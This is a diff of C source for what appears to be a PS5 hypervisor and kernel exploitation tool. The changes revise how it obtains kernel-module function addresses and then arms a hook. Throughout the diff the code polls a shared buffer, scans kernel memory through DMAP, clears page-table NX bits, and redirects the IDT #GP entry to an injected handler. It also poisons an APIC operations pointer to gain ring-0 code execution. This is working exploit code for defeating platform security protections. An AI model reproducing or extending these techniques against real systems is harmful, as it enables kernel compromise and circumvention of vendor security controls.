@@ -1770,34 +1770,84 @@ static void campaign_kmod_kldload(void) {
     uint64_t first_qword;
     memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));
 
-    /* ── Step 4b: Locate module + optional IDT invocation ──
+    /* ── Step 4a: Poll for deferred SYSINIT ──
      *
-     * ALWAYS scan kernel memory for the loaded module's trampoline.
-     * The scanner computes KLD function addresses from the .text layout:
-     *   gp_handler         = trampoline_kva + 0x30
-     *   trampoline_xapic_mode = trampoline_kva + 0x88
+     * PS5's kernel linker defers SYSINIT processing — the shared buffer
+     * may be empty immediately after kldload but populate later (during
+     * a context switch, timer tick, or soft interrupt).  Poll briefly
+     * to give SYSINIT time to fire before falling back to the scanner. */
+    if (first_qword == 0) {
+        printf("\n[*] Step 4a: Buffer empty — polling for deferred SYSINIT...\n");
+        fflush(stdout);
+        for (int poll = 0; poll < 40; poll++) {
+            usleep(50000);  /* 50ms per poll, 2s total max */
+            memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));
+            if (first_qword != 0) {
+                printf("[+] SYSINIT fired after %dms! first_qword=0x%016llx\n",
+                       (poll + 1) * 50, (unsigned long long)first_qword);
+                break;
+            }
+        }
+        if (first_qword == 0) {
+            printf("    SYSINIT did not fire within 2s — continuing with scanner.\n");
+        }
+    }
+
+    /* ── Step 4b: Get KLD addresses ──
      *
-     * This is the ONLY reliable way to get these addresses because PS5's
-     * kernel linker does NOT resolve R_X86_64_64 relocations — so
-     * &gp_handler in the result buffer is always 0.
+     * If SYSINIT fired (first_qword != 0), check the result buffer for
+     * function addresses.  The kmod uses RIP-relative LEA to compute
+     * addresses (avoiding R_X86_64_64 relocations that PS5 doesn't resolve).
      *
-     * If SYSINIT/MOD_LOAD didn't fire (first_qword == 0), we also hook
-     * an IDT entry to invoke hv_init manually via INT from userland.
+     * If SYSINIT didn't fire (first_qword == 0), fall through to the
+     * scanner which tries to find the module in kernel memory via DMAP.
+     * The scanner may fail if module pages are NPT-protected against
+     * DMAP reads (confirmed on FW 4.03).
      *
-     * Since kldstat/kldsym are broken on PS5 (Sony modifications — they
-     * return all zeros), we locate the module by scanning kernel virtual
-     * memory for the trampoline's machine code signature.  The trampoline
-     * is at offset 0 in .text, which is the first SHF_ALLOC section, so
-     * it sits at the very start of the page-aligned kmem_malloc allocation.
-     */
+     * If neither approach yields addresses, Phase 9 falls back to the
+     * inline handler in an NPT-executable kdata cave (proven to work
+     * via ring-0 code execution testing). */
     {
         int need_idt_invoke = (first_qword == 0);
+        int got_addrs_from_buffer = 0;
+
+        /* If SYSINIT fired and result buffer has KMOD_MAGIC, try extracting
+         * addresses directly — this avoids the scanner entirely. */
+        if (!need_idt_invoke && results->magic == KMOD_MAGIC) {
+            printf("\n[*] Step 4b: SYSINIT fired with KMOD_MAGIC — checking result buffer addresses...\n");
+
+            if (results->gp_handler_kva != 0 &&
+                results->trampoline_func_kva != 0 &&
+                results->trampoline_target_kva != 0) {
+                g_kmod_gp_handler = results->gp_handler_kva;
+                g_kmod_trampoline_func = results->trampoline_func_kva;
+                g_kmod_trampoline_target = results->trampoline_target_kva;
+                g_kmod_kid = kid;
+                got_addrs_from_buffer = 1;
+
+                printf("[+] Got KLD addresses from result buffer (RIP-relative LEA):\n");
+                printf("    gp_handler()            = 0x%016lx\n",
+                       (unsigned long)g_kmod_gp_handler);
+                printf("    trampoline_xapic_mode() = 0x%016lx\n",
+                       (unsigned long)g_kmod_trampoline_func);
+                printf("    g_trampoline_target     = 0x%016lx\n",
+                       (unsigned long)g_kmod_trampoline_target);
+                printf("[+] Scanner bypassed — addresses obtained directly from kmod.\n");
+                goto idt_done;
+            } else {
+                printf("    Result buffer addresses still zero (R_X86_64_64 unresolved?).\n");
+                printf("    gp_handler=0x%lx  trampoline_func=0x%lx  trampoline_target=0x%lx\n",
+                       (unsigned long)results->gp_handler_kva,
+                       (unsigned long)results->trampoline_func_kva,
+                       (unsigned long)results->trampoline_target_kva);
+                printf("    Falling through to scanner...\n");
+            }
+        }
 
         if (need_idt_invoke) {
             printf("\n[*] Step 4b: SYSINIT/MOD_LOAD did not fire — scanner + IDT invocation...\n");
-        } else {
-            printf("\n[*] Step 4b: SYSINIT/MOD_LOAD fired — scanning for KLD addresses...\n");
-            printf("    (PS5 linker doesn't resolve R_X86_64_64 — scanner needed for gp_handler)\n");
+        } else if (!got_addrs_from_buffer) {
+            printf("\n[*] Step 4b: SYSINIT fired but addresses unavailable — scanning...\n");
         }
 
         /* ── 4b-1: Locate hv_idt_trampoline in kernel memory ── */
@@ -4750,15 +4800,16 @@ idt_skip: ;
     /* Check Phase 7 trampoline status */
     printf("\n[*] Phase 7 trampoline address status:\n");
     if (g_kmod_trampoline_func && g_kmod_trampoline_target) {
-        printf("    [OK] Addresses computed from scanner (machine code decode).\n");
+        printf("    [OK] Addresses available.\n");
         printf("    trampoline_xapic_mode() = 0x%016lx\n",
                (unsigned long)g_kmod_trampoline_func);
         printf("    g_trampoline_target     = 0x%016lx\n",
                (unsigned long)g_kmod_trampoline_target);
     } else {
-        /* Last-resort fallback: try result buffer (R_X86_64_32S relocs) */
-        printf("    Scanner-based computation didn't set addresses.\n");
-        printf("    Trying result buffer fallback...\n");
+        /* Last-resort: try result buffer (with RIP-relative LEA fix,
+         * these should be non-zero when SYSINIT has fired). */
+        printf("    Addresses not set from primary path.\n");
+        printf("    Trying result buffer...\n");
         printf("    results->trampoline_func_kva  = 0x%lx\n",
                (unsigned long)results->trampoline_func_kva);
         printf("    results->trampoline_target_kva = 0x%lx\n",
@@ -4773,20 +4824,22 @@ idt_skip: ;
         }
     }
 
-    /* gp_handler KVA: prefer scanner-computed value (set above from offset 0x30).
-     * Result buffer value is unreliable (R_X86_64_32S not resolved by PS5 linker). */
+    /* gp_handler KVA: check globals first (set via result buffer or scanner),
+     * then try result buffer fallback. */
     printf("\n[*] Phase 9 gp_handler status:\n");
     if (g_kmod_gp_handler) {
-        printf("    [OK] gp_handler = 0x%016lx (from scanner)\n",
+        printf("    [OK] gp_handler = 0x%016lx\n",
                (unsigned long)g_kmod_gp_handler);
     } else {
-        printf("    [-] gp_handler not set by scanner.\n");
-        printf("    results->gp_handler_kva = 0x%016lx (likely unresolved reloc)\n",
+        printf("    [-] gp_handler not set from primary path.\n");
+        printf("    results->gp_handler_kva = 0x%016lx\n",
                (unsigned long)results->gp_handler_kva);
         if (results->gp_handler_kva != 0) {
             g_kmod_gp_handler = results->gp_handler_kva;
-            printf("    Using result buffer fallback: 0x%016lx\n",
+            printf("    [OK] Using result buffer value: 0x%016lx\n",
                    (unsigned long)g_kmod_gp_handler);
+        } else {
+            printf("    [-] gp_handler unavailable — Phase 9 will use cave fallback.\n");
         }
     }
 
@@ -5883,34 +5936,31 @@ static void campaign_flatz_setup(void) {
         printf("=============================================\n\n");
         fflush(stdout);
 
-        /* ── Phase 9: Build inline handler + arm via KLD ──
+        /* ── Phase 9: Build inline handler + arm ──
          *
-         * The kdata cave handler is NX under NPT — can't execute directly.
-         * CONFIRMED BY TESTING: arming with kdata handler causes panic.
-         *
-         * SOLUTION (from ps5-kstuff "On offsets" documentation):
-         * Use the KLD module's gp_handler() in .text section.  The kernel
-         * linker allocates module memory dynamically — the HV's NPT does
-         * NOT mark dynamically-allocated pages as NX (GMET not enforced
-         * on FW 4.03).  This is proven by INT 210 → hv_idt_trampoline
-         * working during campaign_kmod_kldload.
+         * Priority:
+         *   1. KLD gp_handler (if available from SYSINIT + RIP-relative LEA)
+         *      — NPT-executable (kernel-linker-allocated pages)
+         *   2. Inline handler in kdata cave (if same 2MB NPT page as
+         *      kdata_base, where ring-0 code execution is PROVEN)
+         *   3. Diagnostic only (cave not in executable NPT range)
          *
          * Flow:
-         *   1. Build inline handler (diagnostic, written to cave)
+         *   1. Build inline handler (baked addresses, no relocations)
          *   2. Write cave metadata (IDT backup, xapic, markers)
-         *   3. If KLD gp_handler available:
+         *   3. Clear guest PTE NX on cave page (TLB flush)
+         *   4. If KLD gp_handler available:
          *      a. Patch 6 magic immediates in KLD handler via DMAP
-         *      b. Redirect IDT[13] → KLD handler (IST=3)
-         *      c. Set IST3 → cave stack (cave+0x100)
-         *      d. Poison apic_ops[2] with 0xdeb7 prefix
-         *   4. On next xapic_mode() call:
-         *      #GP fires → KLD handler runs → restores everything → iretq
+         *      b. ARM: IDT[13] → KLD handler, IST3 → cave, poison apic_ops[2]
+         *   5. Else if cave is NPT-executable:
+         *      ARM: IDT[13] → inline handler, IST3 → cave, poison apic_ops[2]
+         *   6. On next xapic_mode() call:
+         *      #GP fires → handler runs → restores everything → iretq
          */
         if (g_kmod_gp_handler) {
-            printf("[*] Phase 9: KLD gp_handler available — will ARM.\n\n");
+            printf("[*] Phase 9: KLD gp_handler available — will ARM via KLD.\n\n");
         } else {
-            printf("[!] Phase 9: DIAGNOSTIC ONLY — KLD handler not loaded.\n");
-            printf("    Inline handler in kdata cave is NX under NPT.\n\n");
+            printf("[*] Phase 9: KLD handler unavailable — will try inline cave handler.\n\n");
         }
         fflush(stdout);
 
@@ -6566,16 +6616,15 @@ phase9_not_armed:
                    (unsigned long)original_xapic);
             printf("[+]\n");
             if (!g_kmod_gp_handler && !cave_npt_executable) {
-                printf("[!]  NOT ARMED — KLD gp_handler unavailable and cave not NPT-executable.\n");
+                printf("[!]  NOT ARMED — no executable handler location available.\n");
+                printf("[!]  KLD gp_handler: unavailable (SYSINIT didn't report addresses).\n");
                 printf("[!]  Cave PA 0x%lx not in kdata_base 2MB NPT page (0x%lx).\n",
                        (unsigned long)cave_pa, (unsigned long)(kdata_base_pa & ~0x1FFFFFULL));
-            } else if (!g_kmod_gp_handler) {
-                printf("[!]  NOT ARMED — KLD gp_handler not available.\n");
-                printf("[!]  Load kernel module first (campaign_kmod_kldload).\n");
+            } else if (g_kmod_gp_handler) {
+                printf("[!]  NOT ARMED — KLD handler patching/verification failed.\n");
             } else {
-                printf("[!]  NOT ARMED — KLD handler patching failed.\n");
+                printf("[!]  NOT ARMED — cave arm should have succeeded (unexpected).\n");
             }
-            printf("[!]  Inline handler in kdata is NX under NPT.\n");
 
             notify("[HV Research] Phase 9 diagnostic complete (not armed).");
         }
